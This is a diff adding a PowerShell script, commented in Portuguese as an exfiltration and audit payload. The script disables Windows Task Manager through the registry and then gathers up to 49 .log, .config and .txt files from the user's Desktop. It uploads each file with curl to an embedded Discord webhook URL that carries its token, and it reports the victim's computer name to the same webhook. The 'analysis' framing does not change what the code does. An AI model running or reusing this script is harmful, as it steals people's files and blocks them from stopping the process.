@@ -1,0 +1,23 @@
+# PAYLOAD (.ps1) - Estrutura de Exfiltração e Auditoria
+# Alvos baseados na lógica de persistência e rede
+$u = 'https://discord.com/api/webhooks/1484361195443196066/GoX9619rfnS7zha8MBZzXEdsReSFosFYFbtFyVfNPVxybJXyXVw7TkLPoj5M-g6nWaXX'
+
+# 1. Desativar Task Manager via Registry (Necessário para análise de persistência)
+Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'DisableTaskMgr' -Value 1
+
+# 2. Lógica de Exfiltração de ficheiros de configuração/logs (Exemplo de Alvos)
+$e = @('*.log', '*.config', '*.txt')
+$p = [Environment]::GetFolderPath('Desktop')
+
+Get-ChildItem -Path $p -Include $e -Recurse | Select-Object -First 49 | ForEach-Object {
+    if ($_.Length -lt 24MB) {
+        $a = 'file=' + [char]64 + $_.FullName
+        curl.exe -k -s -F $a $u
+    }
+}
+
+# 3. Notificação de execução via Webhook
+$m = 'payload=' + [char]64 + 'Payload executado com sucesso no alvo: ' + $env:COMPUTERNAME
+curl.exe -k -s -F $m $u
+
+exit
